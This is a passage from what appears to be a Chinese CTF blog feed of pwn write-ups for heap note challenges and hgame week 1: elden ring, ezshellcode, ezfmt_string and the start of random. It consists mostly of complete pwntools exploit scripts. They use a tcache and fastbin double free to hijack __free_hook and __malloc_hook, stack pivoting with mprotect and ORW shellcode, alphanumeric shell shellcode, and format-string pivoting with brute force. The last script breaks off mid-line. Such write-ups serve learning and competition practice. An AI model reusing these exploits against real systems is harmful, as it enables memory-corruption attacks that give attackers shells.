class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;106.15.72.34&quot;</span>,<span class="number">32534</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;47.100.137.175&quot;,32044)</span></span><br><span class="line"><span class="comment">#elf=ELF(&quot;./vuln&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add_note(i,<span class="number">0x80</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">delete(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena=u64(p.recv(<span class="number">8</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">offset=<span class="number">0x1ecbe0</span></span><br><span class="line">libc_base=main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add_note(i,<span class="number">0x50</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">delete(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add_note(i,<span class="number">0x50</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add_note(7,0x50,b&quot;114514&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">free_hook=libc.sym[<span class="string">&quot;__free_hook&quot;</span>]+libc_base</span><br><span class="line">system=libc.sym[<span class="string">&quot;system&quot;</span>]+libc_base</span><br><span class="line">add_note(<span class="number">7</span>,<span class="number">0x50</span>,p64(free_hook))</span><br><span class="line">add_note(<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add_note(<span class="number">9</span>,<span class="number">0x50</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add_note(<span class="number">10</span>,<span class="number">0x50</span>,p64(system))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="old-fastnotes"><a href="#old-fastnotes" class="headerlink" title="old_fastnotes"></a>old_fastnotes</h2><p>这个版本的glibc在分配fastbins中的chunk时会对size位做检查，检查这个chunk属不属于fastbins,这里还是比较棘手的，不过上网查了下绕过姿势，可以double free后把bk指针改到malloc_hook-0x23的位置来绕过这个检查，这样只需要在edit的时候填充指定的数据，再去把malloc_hook改为one_gadget的地址就可以了</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;106.14.57.14&quot;</span>,<span class="number">30577</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">add_note(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line">add_note(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line">add_note(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena=u64(p.recv(<span class="number">8</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">offset=<span class="number">0x3c4b78</span></span><br><span class="line">libc_base=main_arena-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#arena=libc.sym[&quot;main_arena&quot;]+libc_base</span></span><br><span class="line"><span class="comment">#print(hex(arena))</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add_note(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line">add_note(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="comment">#add_note(2,0x60,b&quot;114514&quot;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#note3=0x602060+0x8*3</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line">add_note(<span class="number">2</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add_note(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line">add_note(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">b&quot;114514&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x13</span>+p64(one_gadget)</span><br><span class="line"><span class="comment">#add_note(10,0x68,b&quot;114514&quot;)</span></span><br><span class="line">add_note(<span class="number">3</span>,<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add_note(3,0x68,b&quot;114514&quot;)</span></span><br><span class="line"><span class="comment">#add_note(5,0x80,b&quot;114514&quot;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment">#add_note(2,0x70,)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame_week1_pwn题解</title>
      <link href="/posts/hgame_week1.html"/>
      <url>/posts/hgame_week1.html</url>
      
        <content type="html"><![CDATA[<h2 id="ezsignIn"><a href="#ezsignIn" class="headerlink" title="ezsignIn"></a>ezsignIn</h2><p>手速够快直接拿下一血</p><h2 id="elden-ring"><a href="#elden-ring" class="headerlink" title="elden ring"></a>elden ring</h2><p>黑屏加载难绷，思路大概这样，栈迁移到bss段，mprotect改bss段权限，然后bss段注入shellcode执行orw.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">32546</span>)</span><br><span class="line">one=<span class="number">0xe3afe</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf=context.binary=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">sleep(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004013e3</span></span><br><span class="line">main=<span class="number">0x401297</span></span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000401290</span></span><br><span class="line">csu1=<span class="number">0x4013dc</span></span><br><span class="line">csu2=<span class="number">0x4013C0</span></span><br><span class="line">gadget=<span class="number">0x000000000002601a</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rsi=<span class="number">0x000000000002601f</span>+libc_base</span><br><span class="line">pop_rdx=<span class="number">0x0000000000142c92</span>+libc_base</span><br><span class="line">pop_rdi=<span class="number">0x0000000000023b6a</span>+libc_base</span><br><span class="line">mprotect=libc_base+libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#sleep(8)</span></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p64(bss)+p64(pop_rsi)+p64(bss)+p64(read_addr)+p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#sleep(0.25)</span></span><br><span class="line">payload=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload+=flat([</span><br><span class="line">pop_rdi,bss,pop_rsi,<span class="number">0x1000</span>,pop_rdx,<span class="number">7</span>,mprotect,bss+<span class="number">0x50</span></span><br><span class="line">])</span><br><span class="line">payload.ljust(<span class="number">0x50</span>,asm(<span class="string">&quot;nop&quot;</span>))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x404000</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,0x404200</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x404200</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">payload+=shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意需要泄露libc基址。然后去调用mprotect</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>搓了半天shellcode发现ae64里面有现成的，这里的shellcode需要满足的约束0&lt;&#x3D;v3&lt;&#x3D;9&amp;&amp;a&lt;&#x3D;v3&lt;&#x3D;z&amp;&amp;A&lt;&#x3D;v3&lt;&#x3D;Z,而ae64生成的shellcode里，满足rax寄存器这个约束的shellcode刚好也满足以上约束，所以直接用生成的就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31380</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#obj=AE64()</span></span><br><span class="line"><span class="comment">#sc=obj.encode(shellcraft.sh(),&quot;rax&quot;)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&#x27;</span></span><br><span class="line">lenth=<span class="built_in">len</span>(shellcode)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt_string"></a>ezfmt_string</h2><p>ez是你的谎言，其实可以给个libc文件 ，libc有时候会影响栈上布局，不给的话感觉不太严谨。我们先看看栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">0x28</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde70</span> ◂— <span class="string">&#x27;make strings and getshell\n&#x27;</span></span><br><span class="line">01:0008│     <span class="number">0x7fffffffde78</span> ◂— <span class="string">&#x27;ings and getshell\n&#x27;</span></span><br><span class="line">02:<span class="number">00</span>10│     <span class="number">0x7fffffffde80</span> ◂— <span class="string">&#x27; getshell\n&#x27;</span></span><br><span class="line">03:0018│     <span class="number">0x7fffffffde88</span> ◂— <span class="number">0x7ffff7000a6c</span> /* <span class="string">&#x27;l\n&#x27;</span> */</span><br><span class="line">04:0020│ r10 <span class="number">0x7fffffffde90</span> ◂— <span class="number">0xa343135343131</span> /* <span class="string">&#x27;114514\n&#x27;</span> */</span><br><span class="line">05:0028│     <span class="number">0x7fffffffde98</span> ◂— <span class="number">0x0</span></span><br><span class="line">06:0030│     <span class="number">0x7fffffffdea0</span> —▸ <span class="number">0x7ffff7e17600</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">07:0038│     <span class="number">0x7fffffffdea8</span> —▸ <span class="number">0x7ffff7c8a5ad</span> (_IO_file_setbuf+<span class="number">13</span>) ◂— test rax, rax</span><br><span class="line">08:0040│     <span class="number">0x7fffffffdeb0</span> —▸ <span class="number">0x7ffff7e1b780</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">09:0048│     <span class="number">0x7fffffffdeb8</span> —▸ <span class="number">0x7ffff7c8157f</span> (setbuffer+<span class="number">191</span>) ◂— test dword ptr [rbx], <span class="number">0x8000</span></span><br><span class="line">0a:0050│     <span class="number">0x7fffffffdec0</span> ◂— <span class="number">0x6f0</span></span><br><span class="line">0b:0058│     <span class="number">0x7fffffffdec8</span> ◂— <span class="number">0x0</span></span><br><span class="line">0c:0060│     <span class="number">0x7fffffffded0</span> —▸ <span class="number">0x7fffffffdef0</span> —▸ <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x1</span></span><br><span class="line">0d:0068│     <span class="number">0x7fffffffded8</span> —▸ <span class="number">0x7fffffffe028</span> —▸ <span class="number">0x7fffffffe35f</span> ◂— <span class="number">0x306b2f656d6f682f</span> (<span class="string">&#x27;/home/k0&#x27;</span>)</span><br><span class="line">0e:0070│     <span class="number">0x7fffffffdee0</span> ◂— <span class="number">0x0</span></span><br><span class="line">0f:0078│     <span class="number">0x7fffffffdee8</span> ◂— <span class="number">0x176937f276af0d00</span></span><br><span class="line"><span class="number">10</span>:0080│ rbp <span class="number">0x7fffffffdef0</span> —▸ <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">11</span>:0088│     <span class="number">0x7fffffffdef8</span> —▸ <span class="number">0x401369</span> (main+<span class="number">60</span>) ◂— mov eax, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>重点在<strong>0x7fffffffded0</strong>处的这个指针，他是指向rbp的，由于只能printf一次，泄露栈上地址不太现实，就只能利用栈上已有的指针。这个指针指向rbp，我们可以改rbp低位，利用两次leave ret实现栈迁移，迁移到哪呢，程序给了我们一个sys函数，我们把这个函数的地址写到栈上，然后尝试把rbp迁移到sys-0x8的位置，如果成功，两次leave ret后就可以返回到sys函数上，由于不确定栈上的地址，需要爆破。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">stack_chk=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line">libc_start_main=elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">system=<span class="number">0x0000000000401245</span></span><br><span class="line"><span class="comment">#payload=fmtstr_payload(10,&#123;stack_chk:system&#125;,write_size=&quot;short&quot;)+b&quot;%17$n&quot;+b&quot;a&quot;*0x13+b&quot;\x08&quot;</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x70</span>&#125;</span>c%18$hhn&quot;</span>.encode()+<span class="string">b&quot;a&quot;</span>*<span class="number">0x4</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>+p64(system)</span><br><span class="line"><span class="comment">#payload=f&quot;%&#123;system&amp;0xffff&#125;c%17$hnaaaa&quot;.encode()+b&quot;a&quot;*0x30+b&quot;\x18&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment">#p.send(payload)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31102</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recv(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>仔细看发现，read在srand之前，且有溢出，刚好能把seed改了，那我们直接把seed改成0,省点事，然后照着他的要求答题就行，用一个循环。最后分两次rop，一次泄露基址并返回到myread,一次ret2libc就可以了。<br>#####exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span 